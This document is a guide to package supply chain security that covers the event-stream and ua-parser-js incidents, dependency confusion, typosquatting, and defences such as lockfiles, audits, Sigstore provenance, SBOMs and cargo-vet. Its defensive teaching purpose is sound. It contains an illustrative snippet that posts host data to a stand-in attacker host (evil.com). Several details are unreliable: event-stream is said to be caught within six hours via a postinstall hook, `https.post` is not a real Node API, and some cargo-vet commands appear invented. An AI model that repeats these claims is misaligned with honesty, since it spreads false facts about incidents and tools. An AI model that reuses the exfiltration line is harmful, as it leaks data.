# Package Supply Chain Security: Attacks, Mitigations, and Provenance

## Overview

Package managers are high-value targets. A single compromised library reaches millions of developers instantly. Real incidents—event-stream (2018), ua-parser-js (2021), dependency confusion—demonstrate that no registry is immune. Supply chain security requires layered defense: lockfiles, hash verification, provenance signing, dependency scanning, and policy enforcement.

## Real-World Incidents

### event-stream (November 2018)

A popular npm library (3M+ weekly downloads) used by millions to process streams. The package wasn't actively maintained; the maintainer, burn out from uncompensated work, transferred ownership to a new contributor. The attacker then injected malicious code into version 3.3.6:

```javascript
// Malicious code in postinstall hook
const flatmap = require('flatmap-stream');
flatmap(function() { /* Cryptocurrency stealer */ });
```

**Attack vector**: Social engineering (burnout, maintainer transfer) + postinstall script execution

**Damage**: Six hours before detection; affected webpack builds, cryptocurrency wallets, backend services

**Detection**: Manual code review; npm has no automated scanning for published versions

**Lesson**: Postinstall scripts run at install time with full access. Malicious code doesn't need to run—just be present.

### ua-parser-js (October 2021)

Popular JavaScript library for parsing user agent strings (7M+ weekly downloads). Maintainer account compromised; attacker published three malicious versions (0.7.29, 0.8.0, 1.0.0):

```javascript
// Exfiltrated data on install
const os = require('os');
const https = require('https');
https.post('https://evil.com/collect', { hostname: os.hostname() });
```

**Attack vector**: Account compromise (weak password or credential leak)

**Damage**: ~4 hours; affected CI/CD systems, development environments

**Detection**: Alert from security researcher monitoring npm registry; versions yanked within hours

**Lesson**: Account security is only as strong as the slowest endpoint (email, GitHub, npm itself).

### Dependency Confusion (2021)

Alex Birsan's research: Most companies use internal, private packages with names matching public npm packages. This creates an attack surface. Attacker publishes `@internal-package-name` to public npm registry with a higher version number. When developers run `npm install`, npm's default resolver pulls the public malicious version instead of the private one.

**Attack vector**: Version precedence exploit (public registry checked before private)

**Impact**: Affects any monorepo or company using private packages without strict scoping

**Mitigation**: Configure `.npmrc` to route scoped packages to private registry:
```ini
@company:registry=https://private.registry.com
```

## Attack Categories

### 1. Typosquatting

Registering packages with names similar to popular ones (typos, unicode lookalikes).

```
lodash       ← Real package
lodash-core  ← Typosquatter

npm install lodash-core  # Oops, installed malicious package
```

**Mitigation**:
- Typo checking in package managers (Yarn, pnpm attempt this)
- Verification before install (read package metadata)
- Private allowlists (prefer whitelisting safe packages)

### 2. Dependency Confusion

Uploading a malicious package with the same name as an internal package but higher version to the public registry.

**Mitigation**:
- Private registry takes precedence (scoped packages)
- Strict version pinning in lockfiles
- `.npmrc` scoping rules

### 3. Account Compromise

Attacker gains credentials (phishing, password reuse, leaked tokens) and publishes malicious versions.

**Mitigation**:
- Two-factor authentication (2FA) on package registry accounts
- Limited-scope personal access tokens (can't sign in, only publish)
- Automatic yanking of suspicious versions
- Monitored publishing activity

### 4. Maintainer Social Engineering

Burnout, financial pressure, or false urgency causes maintainers to cede control or install dependencies with vulnerabilities.

**Mitigation**:
- Minimize privileges (delegated publishing via CI/CD, not developer machines)
- Code review of all dependency updates
- Dependency auditing (removing unused libraries)

### 5. Supply Chain Compromise of Build Infrastructure

Attacker compromises the CI/CD system used to build and publish packages, injecting malware before upload.

**Mitigation**:
- Provenance attestations (SLSA, Sigstore) verify who built what and when
- Immutable, auditable build logs
- Signed artifacts

## Mitigations: Layers of Defense

### Layer 1: Lockfiles and Hashing

**Lockfiles** pin exact versions and transitive dependencies:

```json
{
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-v2kDEyJ+dXQiFLr2vj+..."
    }
  }
}
```

**Integrity hash**: sha512 checksum ensures the downloaded tarball hasn't been tampered with.

**Usage**:
```bash
npm ci  # Uses lockfile, verifies hashes
npm install  # May update lockfile; regenerates hashes
```

**Limitation**: Doesn't prevent an attacker from compromising the package **at upload time**; the malicious version gets hashed.

### Layer 2: Dependency Scanning and SCA

**Software Composition Analysis (SCA)** tools scan lockfiles for known vulnerabilities.

**Tools**:
- npm audit (built-in)
- OWASP Dependency-Check
- Snyk (SCA + remediation)
- Socket.dev (supply chain monitoring)

**Example**:
```bash
npm audit
# npm notice: 3 vulnerabilities found
# npm notice: lodash@4.17.21 has a prototype pollution vulnerability
npm audit fix
```

**Limitations**:
- Only catches **known** vulnerabilities (zero-days still slip through)
- Requires regular updates to vulnerability database
- Can produce false positives

### Layer 3: Provenance and Sigstore

**Provenance**: A cryptographically signed statement answering "Who built this package, when, and on what infrastructure?"

npm + Sigstore (as of 2023):

```bash
npm publish --provenance  # Generates signed provenance statement
```

**Provenance statement** (hidden from users but verifiable):
```json
{
  "buildType": "https://github.com/npm/cli",
  "builder": {
    "id": "https://github.com/npm/npm-provenance"
  },
  "metadata": {
    "invocationID": "abc123",
    "startedOn": "2023-04-19T...",
    "finishedOn": "2023-04-19T...",
    "completeness": {
      "environment": true,
      "materials": true,
      "invocation": true,
      "byproducts": true
    }
  }
}
```

**Sigstore verification** (cosign):
```bash
cosign verify-bundle --bundle provenance.json npm/lodash
```

**Limitation**: Provenance doesn't guarantee the build wasn't malicious—it only proves who ran it. A compromised CI/CD system produces valid provenance for malicious code.

### Layer 4: SBOM and Component Tracking

**Software Bill of Materials** (SBOM) catalogs all dependencies and transitive dependencies.

**Formats**: SPDX, CycloneDX

```json
{
  "SPDXID": "SPDXRef-npm-lodash",
  "name": "lodash",
  "version": "4.17.21",
  "filesAnalyzed": false,
  "downloadLocation": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
  "licenseConcluded": "MIT",
  "externalRefs": [
    {
      "referenceCategory": "PACKAGE-MANAGER",
      "referenceType": "purl",
      "referenceLocator": "pkg:npm/lodash@4.17.21"
    }
  ]
}
```

**Use**:
- Track all components for vulnerability scanning
- License compliance audits
- Supply chain visibility

**Tools**:
- cyclonedx (generates CycloneDX)
- syft (generates SBOM from containers/repos)
- npm sbom (npm v7+)

### Layer 5: Private Registries

A private npm registry (e.g., Artifactory, Nexus, GitHub Packages) can:
- Act as a cache/proxy to the public npm registry
- Host internal packages
- Enforce access controls
- Require authentication for all packages

```bash
npm config set registry https://private.company.com/npm/
```

**Advantage**: Single point of control; can intercept and audit all package pulls.

### Layer 6: Policy Enforcement and Allowlisting

**Fail-safe policies**:
1. Disallow any package not on an approved list
2. Require explicit approval before new packages are used
3. Auto-reject packages with known security issues

**Tool example** (npm audit + CI/CD):
```bash
npm audit --audit-level=moderate
# Fails the build if moderate+ vulnerabilities exist
```

**GitHub/GitLab policies**:
```yaml
# Fail if any security vulnerability is detected
- name: Audit dependencies
  run: npm audit --production --audit-level=critical
```

### Layer 7: cargo-vet (Rust-Specific)

Rust's `cargo-vet` lets teams certify which crate versions have been audited.

```
cargo-vet is similar to pip-audit but maintains a **trust database**: "We've reviewed foo@1.2.3 and certify it's safe."
```

**Workflow**:
```bash
cargo vet add foo 1.2.3    # Mark as audited
cargo vet prune            # Remove outdated audits
cargo vet fetch-all        # Fetch community audits (if available)
```

## Comparing Package Managers' Security Posture

| Manager | Lockfiles | Hashing | Provenance | SBOM | 2FA | Account Control |
|---------|-----------|---------|------------|------|-----|-----------------|
| npm     | ✅ Yes    | ✅ Yes  | ⚠️ Beta   | ✅ Yes | ✅ Yes | ⚠️ Limited |
| PyPI    | ❌ pip only | ✅ Yes | ❌ No | ❌ No | ✅ Yes | ✅ Good |
| crates.io | ✅ Cargo.lock | ✅ Yes | ❌ No | ❌ No | ✅ Yes | ✅ Good |
| Maven   | ✅ pom.xml | ✅ Yes | ❌ No | ❌ No | ✅ Yes | ✅ Good |

## Defense in Depth: A Practical Strategy

### 1. Automated Scanning

```bash
# CI/CD pipeline
npm ci               # Install from lockfile
npm audit            # Scan for known issues
npm sbom             # Generate SBOM for review
```

### 2. Code Review

```
Always review:
- New dependencies (read the package code)
- Version bumps (diff the versions)
- Transitive dependency changes
```

### 3. Minimal Dependencies

```javascript
// ❌ Bloated and risky
import moment from 'moment';
import lodash from 'lodash';

// ✅ Minimal and focused
const now = new Date();
const values = [1, 2, 3].slice(0, 2);
```

Fewer dependencies = smaller attack surface.

### 4. Private Registries for Sensitive Work

```ini
# For healthcare, finance, critical infrastructure
registry=https://private.medical-registry.company.com
```

### 5. Dependency Updates Schedule

```
- Weekly: Security patches (npm audit fix)
- Monthly: Minor updates (test thoroughly)
- Quarterly: Major updates (manual review, integration tests)
```

### 6. Incident Response Plan

- How to detect compromised packages (monitoring)
- How to quickly yank versions (access to npm account)
- How to communicate with downstream users
- How to remediate (force updates)

## Key Takeaways

1. **Lockfiles are mandatory** — They pin known-good versions and enable hash verification
2. **No single mitigation solves supply chain attacks** — Defense in depth required
3. **Provenance (Sigstore)** helps audit "who built this" but doesn't prevent malicious builds
4. **Account security (2FA, scoped tokens)** reduces maintainer account compromise risk
5. **SCA tools** (npm audit, Snyk) catch **known** vulnerabilities; zero-days require vigilance
6. **Dependency minimization** reduces attack surface; use built-ins when possible
7. **Private registries** provide control but add complexity
8. **Community audits** (cargo-vet) distribute security burden
9. **Real incidents** (event-stream, ua-parser-js) show attackers target popular packages; no project is too small to audit
10. **Transparency** (SBOM, provenance) enables downstream consumers to make informed decisions

## See Also

- [security-supply-chain.md](security-supply-chain.md) — SBOM and provenance standards
- [devops-supply-chain-security.md](devops-supply-chain-security.md) — SLSA, Sigstore, and build integrity
- [process-dependency-management.md](process-dependency-management.md) — Dependency updates and SCA workflows